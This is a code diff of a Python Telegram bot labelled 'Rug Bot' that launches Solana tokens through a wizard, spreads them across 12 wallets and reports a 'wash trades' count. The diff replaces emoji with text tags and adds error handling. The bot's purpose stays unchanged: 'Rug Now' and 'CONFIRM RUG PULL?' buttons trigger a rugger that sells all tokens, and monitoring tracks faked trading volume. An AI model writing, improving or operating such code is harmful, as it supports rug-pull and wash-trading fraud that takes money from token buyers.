@@ -41,24 +41,30 @@ launch_wizard = {}
 @bot.message_handler(commands=['start'])
 def handle_start(message):
     """Start command with buttons."""
-    markup = types.InlineKeyboardMarkup()
-    markup.row(
-        types.InlineKeyboardButton("🚀 Launch Token", callback_data="launch_start")
-    )
-    markup.row(
-        types.InlineKeyboardButton("💰 Check Wallets", callback_data="wallets"),
-        types.InlineKeyboardButton("📊 Status", callback_data="status")
-    )
-    
-    welcome_text = (
-        "🤖 Rug Bot Ready!\n\n"
-        "🚀 Click 'Launch Token' to start wizard\n"
-        "💰 Check wallets for funding status\n"
-        "📊 View bot status\n\n"
-        "⚡ All actions available via buttons!"
-    )
-    
-    bot.reply_to(message, welcome_text, reply_markup=markup)
+    try:
+        markup = types.InlineKeyboardMarkup()
+        markup.row(
+            types.InlineKeyboardButton("Launch Token", callback_data="launch_start")
+        )
+        markup.row(
+            types.InlineKeyboardButton("Check Wallets", callback_data="wallets"),
+            types.InlineKeyboardButton("Status", callback_data="status")
+        )
+        
+        welcome_text = (
+            "RUG BOT READY!\n\n"
+            "Commands:\n"
+            "- Launch Token: Start wizard\n"
+            "- Check Wallets: Funding status\n"
+            "- Status: Bot status\n\n"
+            "All actions available via buttons below!"
+        )
+        
+        bot.reply_to(message, welcome_text, reply_markup=markup)
+        print(f"[INFO] /start command processed for chat {message.chat.id}")
+    except Exception as e:
+        print(f"[ERROR] /start failed: {e}")
+        bot.reply_to(message, f"[ERROR] Failed to show buttons: {e}")
 
 @bot.message_handler(commands=['launch'])
 def handle_launch(message):
@@ -94,19 +100,19 @@ def handle_launch(message):
             # Create action buttons
             markup = types.InlineKeyboardMarkup()
             markup.row(
-                types.InlineKeyboardButton("👁 Monitor", callback_data=f"monitor_{mint}"),
-                types.InlineKeyboardButton("💀 Rug Now", callback_data=f"rug_{mint}")
+                types.InlineKeyboardButton("Monitor", callback_data=f"monitor_{mint}"),
+                types.InlineKeyboardButton("Rug Now", callback_data=f"rug_{mint}")
             )
             markup.row(
-                types.InlineKeyboardButton("💰 Check Wallets", callback_data="wallets"),
-                types.InlineKeyboardButton("📊 Status", callback_data="status")
+                types.InlineKeyboardButton("Check Wallets", callback_data="wallets"),
+                types.InlineKeyboardButton("Status", callback_data="status")
             )
             
             success_text = (
-                f"✅ TOKEN CREATED!\n\n"
-                f"📍 Mint: {mint}\n\n"
-                f"🤖 Auto-monitoring: ENABLED\n"
-                f"⚡ Quick actions below:"
+                f"[OK] TOKEN CREATED!\n\n"
+                f"Mint: {mint}\n\n"
+                f"Auto-monitoring: ENABLED\n"
+                f"Quick actions below:"
             )
             
             bot.reply_to(message, success_text, reply_markup=markup)
@@ -290,37 +296,37 @@ def handle_wizard_input(message):
         # Validate name
         name = message.text.strip()
         if len(name) > 32:
-            bot.reply_to(message, "❌ Name too long! Max 32 characters.\n\nTry again:")
+            bot.reply_to(message, "[ERROR] Name too long! Max 32 characters.\n\nTry again:")
             return
         if len(name) < 1:
-            bot.reply_to(message, "❌ Name cannot be empty!\n\nTry again:")
+            bot.reply_to(message, "[ERROR] Name cannot be empty!\n\nTry again:")
             return
         
         state['name'] = name
         state['step'] = 'symbol'
         
-        bot.reply_to(message, f"✅ Name: {name}\n\n💱 Now enter token SYMBOL (e.g., DOGE, MOON):")
+        bot.reply_to(message, f"[OK] Name: {name}\n\nNow enter token SYMBOL (e.g., DOGE, MOON):")
     
     elif state['step'] == 'symbol':
         # Validate symbol
         symbol = message.text.strip().upper()
         if len(symbol) > 10:
-            bot.reply_to(message, "❌ Symbol too long! Max 10 characters.\n\nTry again:")
+            bot.reply_to(message, "[ERROR] Symbol too long! Max 10 characters.\n\nTry again:")
             return
         if len(symbol) < 1:
-            bot.reply_to(message, "❌ Symbol cannot be empty!\n\nTry again:")
+            bot.reply_to(message, "[ERROR] Symbol cannot be empty!\n\nTry again:")
             return
         
         state['symbol'] = symbol
         state['step'] = 'image'
         
-        bot.reply_to(message, f"✅ Symbol: {symbol}\n\n🖼 Now enter image URL (must start with http):")
+        bot.reply_to(message, f"[OK] Symbol: {symbol}\n\nNow enter image URL (must start with http):")
     
     elif state['step'] == 'image':
         # Validate image URL
         image_url = message.text.strip()
         if not image_url.startswith('http'):
-            bot.reply_to(message, "❌ Invalid URL! Must start with http or https.\n\nTry again:")
+            bot.reply_to(message, "[ERROR] Invalid URL! Must start with http or https.\n\nTry again:")
             return
         
         state['image_url'] = image_url
@@ -328,21 +334,21 @@ def handle_wizard_input(message):
         # Show preview and confirmation
         markup = types.InlineKeyboardMarkup()
         markup.row(
-            types.InlineKeyboardButton("✅ Launch Now", callback_data="launch_confirm"),
-            types.InlineKeyboardButton("❌ Cancel", callback_data="launch_cancel")
+            types.InlineKeyboardButton("Launch Now", callback_data="launch_confirm"),
+            types.InlineKeyboardButton("Cancel", callback_data="launch_cancel")
         )
         
         preview_text = (
-            f"📋 TOKEN PREVIEW\n"
+            f"TOKEN PREVIEW\n"
             f"{'='*40}\n\n"
-            f"📝 Name: {state['name']}\n"
-            f"💱 Symbol: {state['symbol']}\n"
-            f"🖼 Image: {image_url}\n\n"
-            f"💰 Cost: ~0.056 SOL (~$10.77)\n"
-            f"🔄 Wallets: 12\n"
-            f"⏱ Time: ~2-3 minutes\n\n"
+            f"Name: {state['name']}\n"
+            f"Symbol: {state['symbol']}\n"
+            f"Image: {image_url}\n\n"
+            f"Cost: ~0.056 SOL (~$10.77)\n"
+            f"Wallets: 12\n"
+            f"Time: ~2-3 minutes\n\n"
             f"{'='*40}\n"
-            f"⚠️ Confirm to launch!"
+            f"[WARNING] Confirm to launch!"
         )
         
         bot.reply_to(message, preview_text, reply_markup=markup)
@@ -369,18 +375,18 @@ def handle_callback(call):
             
             bot.send_message(
                 chat_id,
-                "🚀 TOKEN LAUNCH WIZARD\n\n"
+                "TOKEN LAUNCH WIZARD\n\n"
                 "Let's create your token step by step!\n\n"
-                "📝 Enter token NAME (e.g., Doge Coin, Moon Token):"
+                "Enter token NAME (e.g., Doge Coin, Moon Token):"
             )
         
         # Launch confirmation
         elif data == "launch_confirm":
             if chat_id not in launch_wizard:
-                bot.answer_callback_query(call.id, "❌ Wizard expired, start again")
+                bot.answer_callback_query(call.id, "[ERROR] Wizard expired, start again")
                 return
             
-            bot.answer_callback_query(call.id, "🚀 Launching...")
+            bot.answer_callback_query(call.id, "Launching...")
             
             state = launch_wizard[chat_id]
             name = state['name']
@@ -404,19 +410,19 @@ def handle_callback(call):
                     # Create action buttons
                     markup = types.InlineKeyboardMarkup()
                     markup.row(
-                        types.InlineKeyboardButton("👁 Monitor", callback_data=f"monitor_{mint}"),
-                        types.InlineKeyboardButton("💀 Rug Now", callback_data=f"rug_{mint}")
+                        types.InlineKeyboardButton("Monitor", callback_data=f"monitor_{mint}"),
+                        types.InlineKeyboardButton("Rug Now", callback_data=f"rug_{mint}")
                     )
                     markup.row(
-                        types.InlineKeyboardButton("💰 Check Wallets", callback_data="wallets"),
-                        types.InlineKeyboardButton("📊 Status", callback_data="status")
+                        types.InlineKeyboardButton("Check Wallets", callback_data="wallets"),
+                        types.InlineKeyboardButton("Status", callback_data="status")
                     )
                     
                     success_text = (
-                        f"✅ TOKEN CREATED!\n\n"
-                        f"📍 Mint: {mint}\n\n"
-                        f"🤖 Auto-monitoring: ENABLED\n"
-                        f"⚡ Quick actions below:"
+                        f"[OK] TOKEN CREATED!\n\n"
+                        f"Mint: {mint}\n\n"
+                        f"Auto-monitoring: ENABLED\n"
+                        f"Quick actions below:"
                     )
                     
                     bot.send_message(chat_id, success_text, reply_markup=markup)
@@ -427,17 +433,17 @@ def handle_callback(call):
                     except Exception as monitor_error:
                         bot.send_message(chat_id, f"[WARNING] Monitor failed: {monitor_error}")
                 else:
-                    bot.send_message(chat_id, f"❌ [ERROR] Launch failed")
+                    bot.send_message(chat_id, f"[ERROR] Launch failed")
                     
             except Exception as e:
-                bot.send_message(chat_id, f"❌ [ERROR] Launch failed: {e}")
+                bot.send_message(chat_id, f"[ERROR] Launch failed: {e}")
         
         # Launch cancel
         elif data == "launch_cancel":
             if chat_id in launch_wizard:
                 del launch_wizard[chat_id]
-            bot.answer_callback_query(call.id, "❌ Launch cancelled")
-            bot.edit_message_text("❌ Launch cancelled", chat_id, call.message.message_id)
+            bot.answer_callback_query(call.id, "Launch cancelled")
+            bot.edit_message_text("[CANCELLED] Launch cancelled", chat_id, call.message.message_id)
         
         # Wallets button
         elif data == "wallets":
@@ -458,38 +464,38 @@ def handle_callback(call):
         # Rug button
         elif data.startswith("rug_"):
             mint = data.replace("rug_", "")
-            bot.answer_callback_query(call.id, "⚠️ Executing rug...")
+            bot.answer_callback_query(call.id, "[WARNING] Executing rug...")
             
             # Confirmation markup
             confirm_markup = types.InlineKeyboardMarkup()
             confirm_markup.row(
-                types.InlineKeyboardButton("✅ CONFIRM RUG", callback_data=f"rug_confirm_{mint}"),
-                types.InlineKeyboardButton("❌ Cancel", callback_data="cancel")
+                types.InlineKeyboardButton("CONFIRM RUG", callback_data=f"rug_confirm_{mint}"),
+                types.InlineKeyboardButton("Cancel", callback_data="cancel")
             )
             
             bot.send_message(
                 chat_id,
-                f"⚠️ CONFIRM RUG PULL?\n\nMint: {mint[:16]}...\n\nThis will sell all tokens!",
+                f"[WARNING] CONFIRM RUG PULL?\n\nMint: {mint[:16]}...\n\nThis will sell all tokens!",
                 reply_markup=confirm_markup
             )
         
         # Rug confirmation
         elif data.startswith("rug_confirm_"):
             mint = data.replace("rug_confirm_", "")
-            bot.answer_callback_query(call.id, "💀 Rugging...")
+            bot.answer_callback_query(call.id, "Rugging...")
             bot.send_message(chat_id, f"[RUG] Executing for {mint}...")
             
             success = asyncio.run(rugger.execute(mint))
             
             if success:
-                bot.send_message(chat_id, f"✅ [RUG] SUCCESSFULLY RUGGED {mint}")
+                bot.send_message(chat_id, f"[OK] RUG SUCCESSFULLY EXECUTED {mint}")
             else:
-                bot.send_message(chat_id, f"❌ [ERROR] Rug failed for {mint}")
+                bot.send_message(chat_id, f"[ERROR] Rug failed for {mint}")
         
         # Cancel button
         elif data == "cancel":
             bot.answer_callback_query(call.id, "Cancelled")
-            bot.edit_message_text("❌ Action cancelled", chat_id, call.message.message_id)
+            bot.edit_message_text("[CANCELLED] Action cancelled", chat_id, call.message.message_id)
             
     except Exception as e:
         bot.answer_callback_query(call.id, f"Error: {str(e)[:50]}")
@@ -523,7 +529,7 @@ def handle_wallets_check(chat_id):
         unfunded_count = 0
         total_balance = 0.0
         
-        response_lines = ["💰 WALLET FUNDING STATUS\n" + "="*40 + "\n"]
+        response_lines = ["WALLET FUNDING STATUS\n" + "="*40 + "\n"]
         
         for i, wallet in enumerate(wallets):
             try:
@@ -545,18 +551,18 @@ def handle_wallets_check(chat_id):
                 if balance_sol >= 0.003:
                     status = "FUNDED"
                     funded_count += 1
-                    emoji = "✅"
+                    indicator = "[OK]"
                 elif balance_sol > 0:
                     status = "LOW"
                     unfunded_count += 1
-                    emoji = "⚠️"
+                    indicator = "[WARNING]"
                 else:
                     status = "EMPTY"
                     unfunded_count += 1
-                    emoji = "❌"
+                    indicator = "[EMPTY]"
                 
                 # Add to response
-                response_lines.append(f"{emoji} Wallet {i}: {balance_sol:.4f} SOL")
+                response_lines.append(f"{indicator} Wallet {i}: {balance_sol:.4f} SOL")
                 response_lines.append(f"   {wallet_addr}")
                 response_lines.append(f"   Status: {status}\n")
                 
@@ -565,7 +571,7 @@ def handle_wallets_check(chat_id):
         
         # Summary
         response_lines.append("="*40)
-        response_lines.append(f"\n📊 SUMMARY:")
+        response_lines.append(f"\nSUMMARY:")
         response_lines.append(f"  Total wallets: {len(wallets)}")
         response_lines.append(f"  Funded: {funded_count}")
         response_lines.append(f"  Need funding: {unfunded_count}")
@@ -573,12 +579,12 @@ def handle_wallets_check(chat_id):
         
         if unfunded_count > 0:
             needed_sol = unfunded_count * 0.003
-            response_lines.append(f"\n⚠️ ACTION REQUIRED:")
+            response_lines.append(f"\n[WARNING] ACTION REQUIRED:")
             response_lines.append(f"  Fund {unfunded_count} wallets")
             response_lines.append(f"  Need: {needed_sol:.4f} SOL total")
             response_lines.append(f"  (0.003 SOL per wallet)")
         else:
-            response_lines.append(f"\n✅ All wallets funded!")
+            response_lines.append(f"\n[OK] All wallets funded!")
         
         # Send response (split if too long)
         response = "\n".join(response_lines)
@@ -600,9 +606,9 @@ def handle_status_check(chat_id):
     try:
         status = monitor.get_status()
         status_text = (
-            f"🤖 BOT STATUS\n\n"
-            f"📊 Active tokens: {len(status['active_tokens'])}\n"
-            f"🔄 Wash trades: {status['wash_count']}"
+            f"BOT STATUS\n\n"
+            f"Active tokens: {len(status['active_tokens'])}\n"
+            f"Wash trades: {status['wash_count']}"
         )
         bot.send_message(chat_id, status_text)
     except Exception as e:
